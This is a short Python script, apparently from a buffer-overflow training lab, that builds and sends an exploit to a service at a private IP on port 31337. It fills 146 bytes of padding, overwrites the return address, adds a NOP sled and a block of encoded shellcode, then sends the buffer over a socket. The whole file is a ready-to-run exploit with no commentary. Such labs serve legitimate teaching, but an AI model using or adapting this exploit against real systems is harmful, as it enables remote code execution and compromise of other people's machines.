#/usr/bin/python3

import socket
from struct import pack
ip = "10.10.113.114"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90"*16

payload=("\xbf\xfc\x5e\x94\x11\xdb\xdf\xd9\x74\x24\xf4\x5d\x33\xc9"
"\xb1\x52\x83\xed\xfc\x31\x7d\x0e\x03\x81\x50\x76\xe4\x85"
"\x85\xf4\x07\x75\x56\x99\x8e\x90\x67\x99\xf5\xd1\xd8\x29"
"\x7d\xb7\xd4\xc2\xd3\x23\x6e\xa6\xfb\x44\xc7\x0d\xda\x6b"
"\xd8\x3e\x1e\xea\x5a\x3d\x73\xcc\x63\x8e\x86\x0d\xa3\xf3"
"\x6b\x5f\x7c\x7f\xd9\x4f\x09\x35\xe2\xe4\x41\xdb\x62\x19"
"\x11\xda\x43\x8c\x29\x85\x43\x2f\xfd\xbd\xcd\x37\xe2\xf8"
"\x84\xcc\xd0\x77\x17\x04\x29\x77\xb4\x69\x85\x8a\xc4\xae"
"\x22\x75\xb3\xc6\x50\x08\xc4\x1d\x2a\xd6\x41\x85\x8c\x9d"
"\xf2\x61\x2c\x71\x64\xe2\x22\x3e\xe2\xac\x26\xc1\x27\xc7"
"\x53\x4a\xc6\x07\xd2\x08\xed\x83\xbe\xcb\x8c\x92\x1a\xbd"
"\xb1\xc4\xc4\x62\x14\x8f\xe9\x77\x25\xd2\x65\xbb\x04\xec"
"\x75\xd3\x1f\x9f\x47\x7c\xb4\x37\xe4\xf5\x12\xc0\x0b\x2c"
"\xe2\x5e\xf2\xcf\x13\x77\x31\x9b\x43\xef\x90\xa4\x0f\xef"
"\x1d\x71\x9f\xbf\xb1\x2a\x60\x6f\x72\x9b\x08\x65\x7d\xc4"
"\x29\x86\x57\x6d\xc3\x7d\x30\x98\x1d\x0e\x04\xf4\x1f\xf0"
"\x85\xbe\xa9\x16\xef\xd0\xff\x81\x98\x49\x5a\x59\x38\x95"
"\x70\x24\x7a\x1d\x77\xd9\x35\xd6\xf2\xc9\xa2\x16\x49\xb3"
"\x65\x28\x67\xdb\xea\xbb\xec\x1b\x64\xa0\xba\x4c\x21\x16"
"\xb3\x18\xdf\x01\x6d\x3e\x22\xd7\x56\xfa\xf9\x24\x58\x03"
"\x8f\x11\x7e\x13\x49\x99\x3a\x47\x05\xcc\x94\x31\xe3\xa6"
"\x56\xeb\xbd\x15\x31\x7b\x3b\x56\x82\xfd\x44\xb3\x74\xe1"
"\xf5\x6a\xc1\x1e\x39\xfb\xc5\x67\x27\x9b\x2a\xb2\xe3\xbb"
"\xc8\x16\x1e\x54\x55\xf3\xa3\x39\x66\x2e\xe7\x47\xe5\xda"
"\x98\xb3\xf5\xaf\x9d\xf8\xb1\x5c\xec\x91\x57\x62\x43\x91"
"\x7d")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
  